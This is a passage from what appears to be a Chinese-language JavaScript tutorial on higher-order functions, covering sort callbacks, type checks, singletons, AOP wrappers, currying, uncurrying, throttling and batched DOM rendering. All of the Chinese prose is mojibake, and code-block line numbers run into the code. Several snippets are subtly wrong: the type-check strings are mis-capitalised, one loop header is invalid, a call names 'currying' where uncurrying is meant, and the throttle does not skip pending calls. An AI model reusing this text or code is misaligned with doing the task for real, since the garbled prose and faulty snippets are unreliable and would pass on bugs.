æ–¹æ³•å½“ç„¶çŸ¥é“èŠ‚ç‚¹ä»€ä¹ˆæ—¶å€™åˆ›å»ºå¥½ï¼Œæ‰€ä»¥åœ¨èŠ‚ç‚¹åˆ›å»ºå¥½çš„æ—¶å€™ï¼ŒappendDiv ä¼šæ‰§è¡Œä¹‹å‰å®¢æˆ·ä¼ å…¥çš„å›žè°ƒå‡½æ•°ã€‚*/ 2.Array.prototype.sortArray.prototype.sort å¯ä»¥æŽ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œè¿™ä¸ªå‡½æ•°é‡Œé¢å°è£…äº†æ•°ç»„å…ƒç´ çš„æŽ’åºè§„åˆ™ã€‚ä»Ž Array.prototype.sort çš„ä½¿ç”¨å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç›®çš„æ˜¯å¯¹æ•°ç»„è¿›è¡ŒæŽ’åºï¼Œè¿™æ˜¯ä¸å˜çš„éƒ¨åˆ†ï¼Œè€Œä½¿ç”¨ä»€ä¹ˆè§„åˆ™åŽ»æŽ’åºï¼Œåˆ™æ˜¯å¯å˜çš„éƒ¨åˆ†ã€‚æŠŠå¯å˜çš„éƒ¨åˆ†å°è£…åœ¨å‡½æ•°å‚æ•°é‡Œï¼ŒåŠ¨æ€ä¼ å…¥ Array.prototype.sort ï¼Œä½¿å¾— Array.prototype.sort æ–¹æ³•æˆä¸ºä¸€ä¸ªçµæ´»çš„æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789// ä»Žå°åˆ°å¤§æŽ’åº[1,4,3].sort(function(a,b)&#123; return a - b;&#125;);// ä»Žå¤§åˆ°å°æŽ’åº[1,4,3].sort(function(a,b)&#123; return b - a;&#125;); å‡½æ•°ä½œä¸ºè¿”å›žå€¼è¾“å‡ºç›¸æ¯”æŠŠå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œå‡½æ•°ä½œä¸ºè¿”å›žå€¼è¾“å‡ºçš„åº”ç”¨åœºæ™¯ä¹Ÿå¾ˆå¤šã€‚ä¹Ÿèƒ½ä½“çŽ°å‡½æ•°å¼ç¼–ç¨‹çš„å·§å¦™ï¼Œè®©å‡½æ•°ç»§ç»­è¿”å›žä¸€ä¸ªå¯æ‰§è¡Œçš„å‡½æ•°ï¼Œæ„å‘³ç€è¿ç®—è¿‡ç¨‹æ˜¯å¯ä»¥å»¶ç»­çš„ã€‚ 1.åˆ¤æ–­æ•°æ®ç±»åž‹ åˆ¤æ–­ä¸€ä¸ªæ•°æ®æ˜¯å¦æ˜¯æ•°ç»„ï¼Œåœ¨ä»¥å¾€çš„çŽ°å®žä¸­ï¼Œå¯ä»¥åŸºäºŽé¸­å­ç±»åž‹çš„æ¦‚å¿µæ¥åˆ¤æ–­ï¼Œæ¯”å¦‚åˆ¤æ–­è¿™ä¸ªæ•°æ®æœ‰æ²¡æœ‰ length å±žæ€§ï¼Œæœ‰æ²¡æœ‰ sort æˆ–è€…æ˜¯ slice æ–¹æ³•ç­‰ã€‚ä½†æ›´å¥½çš„æ–¹å¼æ˜¯ç”¨ Object.prototype.toString æ¥è®¡ç®—ã€‚Object.prototype.toString.call(obj) è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ Object.prototype.toString.call([1,2,3]) æ€»æ˜¯è¿”å›ž â€œ[Object Array]â€ ï¼Œè€Œ Object.prototype.toString.call(â€œstrâ€); æ€»æ˜¯è¿”å›ž â€œ[Object String]â€ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ª isType å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536var isString = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object String]';&#125;var isArray = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object Array]';&#125;var isNumber = function(obj)&#123; return Object.prototype.toString.call(obj) === '[Object Number]';&#125;/*ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå‡½æ•°çš„å®žçŽ°å¤§éƒ¨åˆ†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸åŒçš„åªæ˜¯ Object.prototype.toString.call(obj) è¿”å›žçš„å­—ç¬¦ä¸²ï¼Œä¸ºäº†é¿å…å¤šä½™çš„ä»£ç ã€‚æˆ‘ä»¬å°è¯•æŠŠè¿™äº›å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°æå‰æ¤å…¥ isType å‡½æ•°ã€‚*/var isType = function(type)&#123; return function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object" +type+ "]"; &#125;&#125;var isString = isType("String");var isArray = isType("Array");var isNumber = isType("Number");console.log(isArray([1,2,3])); // true/*è¿˜å¯ä»¥ä½¿ç”¨å¾ªçŽ¯æ¥æ³¨å†Œè¿™äº› isType å‡½æ•°*/var Type = &#123;&#125;for(var i = 0; type; type = ['String','Array','Number'];i++)&#123; (function(type)&#123; Type['is'+type] = function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object" +type+ "]"; &#125; &#125;)(type)&#125;Type.isArray([1,2,3]); // true 2.getSingleä¸‹é¢æ˜¯ä¸€ä¸ªå•ä¾‹æ¨¡å¼çš„ä¾‹å­ï¼Œè¿™é‡Œæš‚ä¸”åªäº†è§£å…¶ä»£ç å®žçŽ°ï¼š 123456var getSingle = function(fn)&#123; var ret; return function()&#123; return ret || (ret = fn.apply(this,arguments)) &#125;&#125; ä¸Šé¢è¿™ä¸ªé«˜é˜¶å‡½æ•°çš„ä¾‹å­ï¼Œæ—¢æŠŠå‡½æ•°å½“ä½œå‚æ•°ä¼ é€’ï¼Œåˆè®©å‡½æ•°æ‰§è¡ŒåŽè¿”å›žäº†å¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹ getSingle å‡½æ•°çš„æ•ˆæžœ 1234567var getScript = getSingle(function()&#123; return document.createElement('script');&#125;);var script1 = getScript();var script2 = getScript();console.log(script1 === script2); // true é«˜é˜¶å‡½æ•°å®žçŽ° AOPAOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰çš„ä¸»è¦ä½œç”¨æ˜¯æŠŠä¸€äº›æ ¸å¿ƒä¸šåŠ¡é€»è¾‘æ— å…³çš„åŠŸèƒ½æŠ½ç¦»å‡ºæ¥ï¼Œè¿™äº›è·Ÿä¸šåŠ¡é€»è¾‘æ— å…³çš„åŠŸèƒ½é€šå¸¸åŒ…æ‹¬æ—¥å¿—ç»Ÿè®¡ã€å®‰å…¨æŽ§åˆ¶ã€å¼‚å¸¸å¤„ç†ç­‰ã€‚æŠŠè¿™äº›åŠŸèƒ½æŠ½ç¦»åˆ†æ¥ä¹‹åŽï¼Œå†é€šè¿‡â€œåŠ¨æ€ç»‡å…¥â€çš„æ–¹å¼æŽºå…¥ä¸šåŠ¡é€»è¾‘æ¨¡å—ä¸­ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯é¦–å…ˆæ˜¯å¯ä»¥ä¿æŒä¸šåŠ¡é€»è¾‘æ¨¡å—çš„çº¯å‡€å’Œé«˜å†…èšæ€§ï¼Œå…¶æ¬¡æ˜¯å¯ä»¥æ–¹ä¾¿åœ°å¤ç”¨æ—¥å¿—ç»Ÿè®¡ç­‰åŠŸèƒ½æ¨¡å—ã€‚ åœ¨ Java è¯­è¨€ä¸­ï¼Œå¯ä»¥é€šè¿‡åå°„å’ŒåŠ¨æ€ä»£ç†æœºåˆ¶æ¥å®žçŽ° AOP æŠ€æœ¯ã€‚è€Œåœ¨ JavaScript è¿™ç§åŠ¨æ€è¯­è¨€ä¸­ï¼ŒAOP æ›´åŠ ç®€å•ï¼Œè¿™æ˜¯ JavaScript ä¸Žç”Ÿä¿±æ¥çš„èƒ½åŠ›ã€‚ é€šå¸¸åœ¨ JavaScript ä¸­å®žçŽ° AOP æ˜¯æŒ‡æŠŠä¸€ä¸ªå‡½æ•° â€œåŠ¨æ€ç»‡å…¥â€åˆ°å¦ä¸€ä¸ªå‡½æ•°ä¹‹ä¸­ï¼Œå…·ä½“çš„å®žçŽ°æŠ€æœ¯å¾ˆå¤šï¼Œæœ¬èŠ‚é€šè¿‡æ‰©å±• Function.prototype æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728Function.prototype.before = function(beforefn)&#123; var _self = this; // ä¿å­˜åŽŸå‡½æ•°çš„å¼•ç”¨ return function()&#123; // è¿”å›žåŒ…å«äº†åŽŸå‡½æ•°å’Œæ–°å‡½æ•°çš„â€œä»£ç†å‡½æ•°â€ beforefn.apply(this,arguments); // æ‰§è¡Œæ–°å‡½æ•°ï¼Œä¿®æ­£ this return _self.apply(this,arguments); // æ‰§è¡ŒåŽŸå‡½æ•° &#125;&#125;Function.prototype.after = function(afterfn)&#123; var _self = this; return function()&#123; var ret = _self.apply(this,arguments); afterfn.apply(this,arguments); return ret; &#125;&#125;var func = function()&#123; console.log(2);&#125;func = func.before(function()&#123; console.log(1);&#125;).after(function()&#123; console.log(3);&#125;);func(); // 1 // 2// 3 è¿™ç§ä½¿ç”¨ AOP çš„æ–¹å¼æ¥ç»™å‡½æ•°æ·»åŠ èŒè´£ï¼Œä¹Ÿæ˜¯ JavaScript è¯­è¨€ä¸­ä¸€ç§éžå¸¸ä¹Ÿåˆ«å’Œå·§å¦™çš„è£…é¥°è€…æ¨¡å¼ã€‚è¿™ç§è£…é¥°ç€æ¨¡å¼åœ¨å®žé™…å¼€å‘ä¸­éžå¸¸æœ‰ç”¨ã€‚ é«˜é˜¶å‡½æ•°çš„å…¶ä»–åº”ç”¨1.curryingå‡½æ•°æŸ¯é‡ŒåŒ–ï¼ˆfunction curryingï¼‰ã€‚currying çš„æ¦‚å¿µæ˜¯ç”±ä¿„å›½æ•°å­¦å®¶ Moses SchÃ¶nfinkel å‘æ˜Žï¼Œè€ŒåŽç”±è‘—åçš„æ•°ç†é€»è¾‘å­¦å®¶ Haskell Curry å°†å…¶ä¸°å¯Œå’Œå‘å±•ï¼Œcurrying ç”±æ­¤å¾—åã€‚ currying åˆç§°ä¸ºéƒ¨åˆ†æ±‚å€¼ï¼Œä¸€ä¸ª currying çš„å‡½æ•°é¦–å…ˆä¼šæŽ¥å—ä¸€äº›å‚æ•°ï¼ŒæŽ¥å—äº†è¿™äº›å‚æ•°ä¹‹åŽï¼Œè¯¥å‡½æ•°ä¸ä¼šç«‹å³æ±‚å€¼ï¼Œè€Œæ˜¯ç»§ç»­è¿”å›žå¦å¤–ä¸€ä¸ªå‡½æ•°ï¼Œåˆšæ‰ä¼ å…¥çš„å‚æ•°åœ¨å‡½æ•°å½¢æˆçš„é—­åŒ…ä¸­è¢«ä¿å­˜èµ·æ¥ã€‚å¾…åˆ°å‡½æ•°è¢«çœŸæ­£éœ€è¦æ±‚å€¼çš„æ—¶å€™ï¼Œä¹‹å‰ä¼ å…¥çš„æ‰€æœ‰å‚æ•°éƒ½ä¼šè¢«ä¸€æ¬¡æ€§ç”¨äºŽæ±‚å€¼ã€‚ å‡è®¾æˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªè®¡ç®—æ¯æœˆå¼€é”€çš„å‡½æ•°ï¼Œåœ¨æ¯å¤©ç»“æŸä¹‹å‰ï¼Œæˆ‘ä»¬éƒ½è¦è®°å½•ä»Šå¤©èŠ±æŽ‰äº†å¤šå°‘é’±ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334var monthlyCost = 0;var cost = function(money)&#123; monthlyCost += money;&#125;cost(100); // ç¬¬ 1 å¤©å¼€é”€cost(100); // ç¬¬ 2 å¤©å¼€é”€cost(300); // ç¬¬ 3 å¤©å¼€é”€console.log(monthlyCost); // è¾“å‡ºå¼€é”€ï¼š500/*å…¶å®žæˆ‘ä»¬å¹¶ä¸å¤ªå…³å¿ƒæ¯å¤©èŠ±æŽ‰äº†å¤šå°‘é’±ï¼Œè€Œæ˜¯åªæƒ³çŸ¥é“æœˆåº•çš„æ—¶å€™èŠ±æŽ‰äº†å¤šå°‘é’±ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®žé™…ä¸Šåªéœ€è¦åœ¨æœˆåº•è®¡ç®—ä¸€æ¬¡ã€‚*/var cost = (function()&#123; var args = []; return function()&#123; if(arguments.length === 0)&#123; var money = 0; for(var i = 0; i &lt; args.length; i++)&#123; money += args[i]; &#125; return money; &#125;else&#123; [].push.apply(args,arguments); &#125; &#125;&#125;)();cost(100); // æœªçœŸæ­£æ±‚å€¼cost(100); // æœªçœŸæ­£æ±‚å€¼cost(300); // æœªçœŸæ­£æ±‚å€¼console.log(cost()); // è¾“å‡ºå¼€é”€ï¼š500 ä¸‹é¢æ˜¯ä¸€ä¸ªé€šç”¨çš„ function currying(){} ã€‚æŽ¥å—ä¸€ä¸ªå‚æ•°ï¼Œå³å°†è¦è¢« currying çš„å‡½æ•°ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨éåŽ†æœ¬æœˆæ¯å¤©çš„å¼€é”€å¹¶æ±‚å‡ºå®ƒä»¬çš„æ€»å’Œã€‚ 1234567891011121314151617181920212223242526272829var currying = function(fn)&#123; var args = []; return function()&#123; if(arguments.length === 0)&#123; return fn.apply(this,args); &#125;else&#123; [].push.apply(args,arguments); return arguments.callee; &#125; &#125;&#125;var cost = (function()&#123; var money = 0; return function()&#123; for(var i = 0; i &lt; arguments.length; i++)&#123; money += arguments[i] &#125; return money; &#125;&#125;)();var cost = currying(cost); // è½¬æ¢ä¸º curring å‡½æ•°cost(100); // æœªçœŸæ­£æ±‚å€¼cost(100); // æœªçœŸæ­£æ±‚å€¼cost(300); // æœªçœŸæ­£æ±‚å€¼console.log(cost()); // è¾“å‡ºå¼€é”€ï¼š500 å½“è°ƒç”¨ cost å‡½æ•°æ—¶ï¼Œå¦‚æžœæ˜Žç¡®åœ°å¸¦ä¸Šäº†ä¸€äº›å‚æ•°ï¼Œè¡¨ç¤ºè¯¥å‡½æ•°æ­¤æ—¶å¹¶ä¸æ˜¯çœŸæ­£çš„æ±‚å€¼è®¡ç®—ï¼Œè€Œæ˜¯æŠŠè¿™äº›å‚æ•°ä¿å­˜èµ·æ¥ï¼Œæ­¤æ—¶è®© cost å‡½æ•°è¿”å›žå¦ä¸€ä¸ªå‡½æ•°ã€‚åªæœ‰å½“æˆ‘ä»¬å¯ä»¥ä¸å¸¦å‚æ•°çš„å½¢å¼æ‰§è¡Œ cost æ—¶ï¼Œæ‰åˆ©ç”¨å‰é¢ä¿å­˜çš„é‡‡çº³æ•°ï¼ŒçœŸæ­£å¼€å§‹è¿›è¡Œæ±‚å€¼è®¡ç®—ã€‚ 2.uncurryingåœ¨ JavaScript ä¸­ï¼Œå½“æˆ‘ä»¬è°ƒç”¨å¯¹è±¡çš„æŸä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œå…¶å®žä¸ç”¨å…³ç³»è¯¥å¯¹è±¡åŽŸæœ¬æ˜¯å¦è¢« è®¾è®¡ä¸ºæ‹¥æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œè¿™æ˜¯åŠ¨æ€ç±»åž‹è¯­è¨€çš„ç‰¹ç‚¹ï¼Œä¹Ÿå°±æ˜¯å¸¸è¯´çš„é¸­å­ç±»åž‹ã€‚ åŒç†ï¼Œä¸€ä¸ªå¯¹è±¡ä¹Ÿæœªå¿…åªèƒ½ä½¿ç”¨å®ƒè‡ªèº«çš„æ–¹æ³•ï¼Œé‚£ä¹ˆæœ‰ä»€ä¹ˆåŠžæ³•å¯ä»¥è®©å¯¹è±¡åŽ»å€Ÿç”¨ä¸€ä¸ªåŽŸæœ¬ä¸å±žäºŽå®ƒçš„æ–¹æ³•å‘¢ï¼Ÿ ç­”æ¡ˆå¾ˆç®€å•ï¼Œapply å’Œ call éƒ½å¯ä»¥ã€‚ 12345678910var obj1 = &#123; name:'sven'&#125;var obj2 = &#123; getName:function()&#123; return this.name; &#125;&#125;console.log(obj2.getName.call(obj1)); // sven æˆ‘ä»¬å¸¸å¸¸è®©ç±»æ•°ç»„å¯¹è±¡åŽ»å€Ÿç”¨ Array.prototype çš„æ–¹æ³•ï¼Œè¿™æ˜¯ call å’Œ apply æœ€å¸¸è§çš„å¼•ç”¨åœºæ™¯ä¹‹ä¸€ï¼š 1234(function()&#123; Array.prototype.push.call(arguments,4); // arguments å€Ÿç”¨ Array.protytype.push æ–¹æ³• console.log(arguments);&#125;)(1,2,3); åœ¨æˆ‘ä»¬é¢„æœŸä¸­ï¼ŒArray.prototype ä¸Šçš„æ–¹æ³•åŽŸæœ¬åªèƒ½ç”¨æ¥æ“ä½œ array å¯¹è±¡ï¼Œä½†ç”¨ call å’Œ apply å¯ä»¥æŠŠä»»æ„å¯¹è±¡å½“åš this æ¥ä¼ å…¥æŸä¸ªæ–¹æ³•ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæ–¹æ³•ä¸­ç”¨åˆ°çš„ this çš„æ–¹æ³•å°±ä¸å†å±€é™äºŽåŽŸæ¥è§„å®šçš„å¯¹è±¡äº†ï¼Œè€Œæ˜¯åŠ ä»¥æ³›åŒ–å¹¶å¾—åˆ°æ›´å¹¿çš„é€‚ç”¨æ€§ã€‚ é‚£ä¹ˆæœ‰æ²¡æœ‰æŠŠæ³›åŒ– this çš„è¿‡ç¨‹æå–å‡ºæ¥å‘¢ï¼Ÿuncurrying å°±æ˜¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚uncurrying çš„è¯é¢˜æ˜¯ JavaScript ä¹‹çˆ¶ Brendan Eich åœ¨ 2011 å¹´å‘è¡¨çš„ä¸€ç¯‡ Twitterã€‚ä»¥ä¸‹ä»£ç æ˜¯ uncurrying çš„å®žçŽ°æ–¹å¼ä¹‹ä¸€ï¼š 1234567Function.prototype.uncurrying = function()&#123; var self = this; return function()&#123; var obj = Array.prototype.shift.call(arguments); return self.apply(obj,arguments); &#125;&#125; ç±»æ•°ç»„å¯¹è±¡ arguments å€Ÿç”¨ Array.prototype çš„æ–¹æ³•ä¹‹å‰ï¼Œå…ˆæŠŠ Array.prototype.push.call() è¿™å¥ä»£ç è½¬æ¢ä¸ºä¸€ä¸ªé€šç”¨çš„ push å‡½æ•°ï¼š 123456var push = Array.prototype.push.uncurrying();(function()&#123; push(arguments,4); console.log(arguments);&#125;)(1,2,3);// [1,2,3,4] é€šè¿‡ uncurrying çš„æ–¹å¼ï¼ŒArray.prototype.push.call å˜æˆäº†ä¸€ä¸ªé€šç”¨çš„ push å‡½æ•°ï¼Œè¿™æ ·ä¸€æ¥ï¼Œpush å‡½æ•°çš„ä½œç”¨å°±è·Ÿ Array.prototype.push ä¸€æ ·äº†ï¼ŒåŒæ ·ä¸ä»…ä»…å±€é™äºŽåªèƒ½æ“ä½œ array å¯¹è±¡ã€‚è€Œå¯¹äºŽä½¿ç”¨è€…æ¥è¯´ï¼Œè°ƒç”¨ push å‡½æ•°çš„æ–¹å¼ä¹Ÿæ˜¾å¾—æ›´åŠ ç®€æ´å’Œæ„å›¾æ˜Žäº†äº†ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥ä¸€æ¬¡æ€§å°† Array.prototype ä¸Šçš„æ–¹æ³•â€œå¤åˆ¶â€åˆ° array å¯¹è±¡ï¼ŒåŒæ ·è¿™äº›æ–¹æ³•å¯æ“ä½œçš„å¯¹è±¡ä¹Ÿä¸ä»…ä»…æ˜¯ array å¯¹è±¡ 123456789101112131415161718192021222324for(var i = 0; fn, ary = ['push','shift','forEach'];fn = ary[i++])&#123; Array[fn] = Array.prototype[fn].currying();&#125;var obj = &#123; "length":3, "0":1, "1":2, "2":3&#125;Array.push(obj,4); console.log(obj.length); // 4var first = Array.shift(obj);console.log(first); // 1console.log(obj); // &#123;0:2,1:3,2:4,length:3&#125;Array.forEach(obj,function(i,n)&#123; console.log(n);&#125;);// 0// 1// 2 ç”šè‡³ Function.prototype.call å’Œ Function.prototype.apply æœ¬èº«ä¹Ÿå¯ä»¥è¢« uncurrying ,ä¸è¿‡è¿™å¹¶æ²¡æœ‰å®žç”¨ä»·å€¼ï¼Œåªæ˜¯ä½¿å¾—å¯¹å‡½æ•°çš„è°ƒç”¨çœ‹èµ·æ¥æ›´åƒæ˜¯ JavaScript è¯­è¨€çš„å‰èº« Scheme 123456789101112var call = Function.prototype.call.uncurrying();var fn = function(name)&#123; console.log(name);&#125;call(fn,window,'sven'); // svenvar apply = Function.prototype.apply.uncurrying();var fn = function(name)&#123; console.log(name); console.log(arguments);&#125;apply(fn,&#123;name:'sven'&#125;,[1,2,3]); uncurrying çš„å¦å¤–ä¸€ç§å®žçŽ°æ–¹å¼ï¼š 123456Function.prototype.uncurrying = function()&#123; var self = this; return function()&#123; return Function.prototype.call.apply(self,arguments); &#125;&#125; 3.å‡½æ•°èŠ‚æµJavaScript ä¸­å‡½æ•°å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯ç”±ç”¨æˆ·ä¸»åŠ¨è°ƒç”¨è§¦å‘çš„ï¼Œé™¤éžæ˜¯å‡½æ•°æœ¬èº«çš„å®žçŽ°ä¸åˆç†ï¼Œå¦åˆ™æˆ‘ä»¬ä¸ä¼šé‡åˆ°è·Ÿæ€§èƒ½ç›¸å…³çš„é—®é¢˜ã€‚ä½†æ˜¯åœ¨ä¸€äº›å°‘æ•°æƒ…å†µä¸‹ï¼Œå‡½æ•°çš„è§¦å‘ä¸æ˜¯ç”±ç”¨æˆ·ç›´æŽ¥æŽ§åˆ¶çš„ã€‚åœ¨è¿™äº›åœºæ™¯ä¸‹ï¼Œå‡½æ•°æœ‰å¯èƒ½ä¼šè¢«éžå¸¸é¢‘ç¹åœ°è°ƒç”¨ï¼Œè€Œé€ æˆå¾ˆå¤§çš„æ€§èƒ½é—®é¢˜ã€‚ä¸‹é¢åˆ—ä¸¾ä¸€äº›åœºæ™¯ã€‚ ï¼ˆ1ï¼‰å‡½æ•°è¢«é¢‘ç¹è°ƒç”¨çš„åœºæ™¯ window.onresize äº‹ä»¶ã€‚ç»™ window å¯¹è±¡ç»‘å®šäº†è¿™ä¸ªäº‹ä»¶åŽï¼Œå½“æµè§ˆå™¨çª—å£å¤§å°è¢«æ‹–åŠ¨è€Œæ”¹å˜çš„æ—¶å€™ï¼Œè¿™ä¸ªäº‹ä»¶çš„è§¦å‘é¢‘çŽ‡å¾ˆé«˜ï¼Œå¦‚æžœæˆ‘ä»¬åœ¨ window.onresize äº‹ä»¶å‡½æ•°é‡Œé¢æœ‰ä¸€äº›è·Ÿ DOM èŠ‚ç‚¹ç›¸å…³çš„æ“ä½œï¼Œè€Œè·Ÿ DOM èŠ‚ç‚¹ç›¸å…³çš„æ“ä½œå¾€å¾€æ˜¯éžå¸¸æ¶ˆè€—æ€§èƒ½çš„ï¼Œè¿™æ—¶å€™æµè§ˆå™¨å°±æœ‰å¯èƒ½ä¼šåƒä¸æ¶ˆè€Œé€ æˆå¡é¡¿çš„çŽ°è±¡ã€‚ mousemove äº‹ä»¶ã€‚åŒæ ·æˆ‘ä»¬ç»™ä¸€ä¸ª div èŠ‚ç‚¹ç»‘å®šäº†æ‹–æ›³äº‹ä»¶ï¼ˆä¸»è¦æ˜¯ mouseoverï¼‰,å½“ div èŠ‚ç‚¹è¢«æ‹–åŠ¨çš„æ—¶å€™ï¼Œä¹Ÿä¼šé¢‘ç¹è§¦å‘è¯¥æ‹–æ›³äº‹ä»¶å‡½æ•° ä¸Šä¼ è¿›åº¦ï¼Œå¾®äº‘çš„ä¸Šä¼ åŠŸèƒ½ä½¿ç”¨äº†ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶ã€‚è¯¥æµè§ˆå™¨æ’ä»¶åœ¨çœŸæ­£å¼€å§‹ä¸Šä¼ æ–‡ä»¶ä¹‹å‰ï¼Œä¼šå¯¹æ–‡ä»¶è¿›è¡Œæ‰«æå¹¶é€šçŸ¥ JavaScript å‡½æ•°ï¼Œä»¥ä¾¿åœ¨é¡µé¢ä¸­æ˜¾ç¤ºå½“å‰çš„æ‰«æè¿›åº¦ã€‚ä½†è¯¥æ’ä»¶é€šçŸ¥çš„é¢‘çŽ‡éžå¸¸ä¹‹é«˜ï¼Œå¤§çº¦1ç§’10æ¬¡ï¼Œå¾ˆæ˜¾ç„¶æˆ‘ä»¬åœ¨é¡µé¢ä¸­ä¸éœ€è¦å¦‚æ­¤é¢‘ç¹åœ°åŽ»æç¤ºç”¨æˆ·ã€‚ ï¼ˆ2ï¼‰å‡½æ•°èŠ‚æµçš„åŽŸç† å‡½æ•°èŠ‚æµçš„æ˜¯å®žçŽ°æœ‰å¾ˆå¤šç§ï¼Œä¸‹é¢çš„ throttle å‡½æ•°çš„åŽŸç†æ˜¯ï¼Œå°†å³å°†è¦è¢«æ‰§è¡Œçš„å‡½æ•°ç”¨ setTimeout å»¶è¿Ÿä¸€æ®µæ—¶é—´æ‰§è¡Œã€‚å¦‚æžœè¯¥å»¶è¿Ÿæ‰§è¡Œè¿˜æ²¡æœ‰å®Œæˆï¼Œåˆ™å¿½ç•¥æŽ¥ä¸‹æ¥è°ƒç”¨è¯¥å‡½æ•°çš„è¯·æ±‚ã€‚throttle æŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºéœ€è¦è¢«å»¶è¿Ÿæ‰§è¡Œçš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸ºå»¶è¿Ÿæ‰§è¡Œçš„æ—¶é—´ã€‚ 12345678910111213141516171819202122var throttle = function(fn,interval)&#123; var _self = fn, // ä¿å­˜éœ€è¦è¢«å»¶è¿Ÿæ‰§è¡Œçš„å‡½æ•°å¼•ç”¨ timer, // å®šæ—¶å™¨ firstTime = true; // æ˜¯å¦ç¬¬ä¸€æ¬¡è°ƒç”¨ return function()&#123; var args = arguments, _me = this; if(firstTime)&#123; // å¦‚æžœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œä¸éœ€è¦å»¶è¿Ÿæ‰§è¡Œ _self.apply(_me,args); return firstTime = false; &#125; timer = setTimeout(function()&#123; // å»¶è¿Ÿä¸€æ®µæ—¶é—´æ‰§è¡Œ clearTimeout(timer); timer = null; _self.apply(_me,args); &#125;,interval || 500); &#125;&#125;window.onresize = throttle(function()&#123; console.log(1);&#125;,500); 4.åˆ†æ—¶å‡½æ•°ä¸Šé¢æä¾›äº†ä¸€ç§é™åˆ¶å‡½æ•°è¢«é¢‘ç¹è°ƒç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯è¿˜æœ‰å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼ŒæŸäº›å‡½æ•°æ˜¯ç”¨æˆ·ä¸»åŠ¨è°ƒç”¨çš„ï¼Œä½†æ˜¯è¿™äº›å‡½æ•°æœ‰æ—¶å€™ä¼šä¸¥é‡å½±å“é¡µé¢æ€§èƒ½ã€‚ ä¸€ä¸ªä¾‹å­å°±æ˜¯åˆ›å»º WebQQ çš„ QQ å¥½å‹åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­é€šå¸¸æœ‰å¾ˆå¤šä¸ªå¥½å‹ï¼Œå¦‚æžœä¸€ä¸ªå¥½å‹ç”¨ä¸€ä¸ªèŠ‚ç‚¹æ¥è¡¨ç¤ºï¼Œå½“æˆ‘ä»¬åœ¨é¡µé¢ä¸­æ¸²æŸ“è¿™ä¸ªåˆ—è¡¨çš„æ—¶å€™ï¼Œå¯èƒ½ä¸€æ¬¡æ€§è¦åˆ›å»ºæˆç™¾ä¸Šåƒä¸ªèŠ‚ç‚¹ã€‚ åœ¨çŸ­æ—¶é—´å†…é¡µé¢å¤§é‡æ·»åŠ  DOM èŠ‚ç‚¹æ˜¾ç„¶ä¼šè®©æµè§ˆå™¨åƒä¸æ¶ˆï¼Œé‚£ä¹ˆå¯èƒ½æµè§ˆå™¨ä¼šå¡æ­»æˆ–è€…æ˜¯å¡é¡¿ã€‚ 1234567891011121314var ary = [];for(var i = 0; i &lt;= 1000; i++)&#123; ary.push(i);&#125;var renderFrinedList = function(data)&#123; for(var i = 0; i &lt;= data.length; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); &#125;&#125;renderFrinedList(ary); è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€æ˜¯ä¸‹é¢çš„ timeChunk å‡½æ•°ï¼ŒtimeChunk å‡½æ•°è®©åˆ›å»ºèŠ‚ç‚¹çš„å·¥ä½œåˆ†æ‰¹è¿›è¡Œï¼Œæ¯”å¦‚æ¯1ç§’åˆ›å»º1000ä¸ªèŠ‚ç‚¹ï¼Œæ”¹æˆäº†æ¯éš”200æ¯«ç§’åˆ›å»º8ä¸ªèŠ‚ç‚¹ã€‚ timeChunk æŽ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆ›å»ºèŠ‚ç‚¹æ—¶éœ€è¦çš„ç”¨åˆ°çš„æ•°æ®ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å°è£…äº†åˆ›å»ºèŠ‚ç‚¹é€»è¾‘çš„å‡½æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºæ¯ä¸€æ‰¹åˆ›å»ºèŠ‚ç‚¹çš„æ•°é‡ã€‚ 12345678910111213141516171819202122232425262728293031323334var timeChunk = 